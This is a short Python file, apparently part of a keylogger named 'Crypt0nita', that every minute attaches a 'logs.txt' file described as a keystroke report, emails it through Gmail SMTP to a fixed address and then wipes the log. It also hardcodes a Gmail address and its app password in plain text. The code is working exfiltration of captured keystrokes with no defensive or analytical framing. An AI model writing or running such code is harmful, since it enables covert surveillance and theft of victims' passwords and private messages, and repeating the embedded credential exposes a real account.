import smtplib
from email.message import EmailMessage
import datetime
import time
import os

def sendmail():
            os.system("touch logs.txt")
            email = "yhelenasw@gmail.com"
            senha_do_gmail = "lzbatebfonurcjif"

            msg = EmailMessage()
            msg['Subject'] = "Enviando email com python"
            msg['From'] = "hildofilhohotmail.com@gmail.com"
            msg['To'] = "yhelenasw@gmail.com"
            msg.set_content("Segue o relatório de teclas da Crypt0nita ")

            with open("logs.txt", "rb") as content_file:
            
                content = content_file.read()
                msg.add_attachment(content, maintype='application', subtype='pdf', filename='logs.txt')

            with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            
                smtp.login(email, senha_do_gmail)
                smtp.send_message(msg)
            
            os.system("echo '' > logs.txt")



def time_verify():

    hora_inicial = datetime.datetime.now() + datetime.timedelta(minutes=1)

    while True:
        agora = datetime.datetime.now()
        if agora >= hora_inicial:
            sendmail()
            hora_inicial = agora + datetime.timedelta(minutes=1)
        time.sleep(60)  # Espera 1 minuto antes de verificar novamente

